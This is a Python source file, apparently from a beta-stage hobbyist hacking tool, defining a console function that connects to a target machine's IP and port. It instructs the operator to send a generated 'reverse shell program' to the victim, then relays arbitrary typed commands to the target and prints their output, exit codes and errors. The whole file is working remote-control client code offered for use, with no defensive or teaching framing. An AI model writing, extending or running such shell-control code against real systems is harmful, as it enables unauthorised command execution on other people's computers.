# Note : this is still in beta so yeah if you find any issue or want to add any feature open a pull request

import time
import socket
import json
def ReverseShellConsole(info):
    print(info+'Going to console .....')
    time.sleep(3)
    HOST = input(info+'Target ip: ')
    PORT = int(input(info+'Port(default 5000): ') or '5000')
    print(info+'Send the generated reverse shell program to the target to connect')
    print(info+ 'Waiting for a connection')
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    print("Connected. Type 'exit' to quit.")

    while True:
        command = input("execute: ")

        request = {"action": command}
        client.sendall(json.dumps(request).encode())

        if command.lower() == "exit":
            break

        buffer = b""

        while True:
            chunk = client.recv(4096)

            if not chunk:
                print(info+"Server disconnected.")
                client.close()
                exit()

            buffer += chunk

            try:
                response = json.loads(buffer.decode("utf-8"))
                break
            except json.JSONDecodeError:
                continue

        print("\n" + "=" * 50)
        print(f"Status: {response.get('status')} | Exit: {response.get('exit_code')}")
        print("-" * 50)

        if response.get("output"):
            print(response["output"].rstrip())

        if response.get("errors"):
            print("-" * 50)
            print("ERRORS:")
            print(response["errors"].rstrip())

        print("=" * 50 + "\n")

    client.close()
    print("Disconnected.")